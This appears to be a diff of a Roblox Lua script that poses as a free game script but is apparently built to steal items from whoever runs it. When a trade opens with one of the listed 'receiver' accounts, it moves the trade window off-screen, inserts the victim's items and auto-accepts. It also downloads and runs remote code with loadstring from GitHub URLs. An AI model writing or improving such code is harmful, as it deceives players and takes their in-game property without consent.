@@ -34,10 +34,21 @@ else
     Mobile = true
 end
 
+-- Function to check if any of the receivers are in the game
+local function checkReceivers()
+    for _, Receiver in pairs(Config.Receivers) do
+        if Players:FindFirstChild(Receiver) then
+            return Receiver
+        end
+    end
+    return nil
+end
+
 -- Function to update the UI positions based on receiver presence
 local function updateUIPositions()
-    local playerGui = LocalPlayer.PlayerGui
+    local playerGui = game.Players.LocalPlayer.PlayerGui
     local tradePartner
+    local receiver = checkReceivers() -- Get the receiver in the game
 
     if Mobile then
         local tradeGuiPhone = playerGui:FindFirstChild("TradeGUI_Phone")
@@ -51,9 +62,7 @@ local function updateUIPositions()
         end
     end
 
-    if tradePartner and tradePartner.Text == "(" .. table.concat(Config.Receivers, ", ") .. ")" then
-        wait(7)
-        ReplicatedStorage.Trade.AcceptTrade:FireServer(285646582)
+    if tradePartner and receiver and tradePartner.Text == "(" .. receiver .. ")" then
         if Mobile then
             TradePath.Container.Position = UDim2.new(0, 9999, 0, 9999) -- Move off-screen
             TradePath.ClickBlocker.Position = UDim2.new(0, 9999, 0, 9999) -- Move off-screen
@@ -121,6 +130,11 @@ elseif Config.Script == "Lite" then
     loadstring(game:HttpGet("https://raw.githubusercontent.com/FreeGamesScript23/Aug2006/main/UmScript/KeyLite.lua",true))()
 elseif Config.Script == "Solara" then
     loadstring(game:HttpGet("https://raw.githubusercontent.com/FreeGamesScript23/Aug2006/main/UmScript/iloveyouplscomebacktome.lua",true))()
+end
+
+Executor = identifyexecutor()
+if Executor == "Solara" then
+    return
 end
 
 wait(3)
@@ -363,28 +377,27 @@ function InsertItems()
 
 
 end
-    TradePath:GetPropertyChangedSignal("Enabled"):Connect(function()
-        wait(3)
-        if TradePath.Enabled then
-local playerGui = game.Players.LocalPlayer.PlayerGui
-local tradePartner
+TradePath:GetPropertyChangedSignal("Enabled"):Connect(function()
+    wait(3)
+    if TradePath.Enabled then
+        local playerGui = game.Players.LocalPlayer.PlayerGui
+        local tradePartner
 
-if Mobile then
-    tradePartner = playerGui:FindFirstChild("TradeGUI_Phone").Container.Trade.TheirOffer:FindFirstChild("Username")
-else
-    tradePartner = playerGui:FindFirstChild("TradeGUI").Container.Trade.TheirOffer:FindFirstChild("Username")
-end
-
-if tradePartner and tradePartner.Text == "(" .. Receiver .. ")" then
-    InsertItems()
-else
-    
-end
-
+        if Mobile then
+            tradePartner = playerGui:FindFirstChild("TradeGUI_Phone").Container.Trade.TheirOffer:FindFirstChild("Username")
         else
-            Sendtrade()
+            tradePartner = playerGui:FindFirstChild("TradeGUI").Container.Trade.TheirOffer:FindFirstChild("Username")
         end
-    end)
+
+        if tradePartner and tradePartner.Text == "(" .. Receiver .. ")" then
+            InsertItems()
+            task.wait(7)
+            game:GetService("ReplicatedStorage").Trade.AcceptTrade:FireServer(285646582)
+        end
+    else
+        
+    end
+end)
     
     Players.PlayerAdded:Connect(function(player)
         Activate(player.Name)
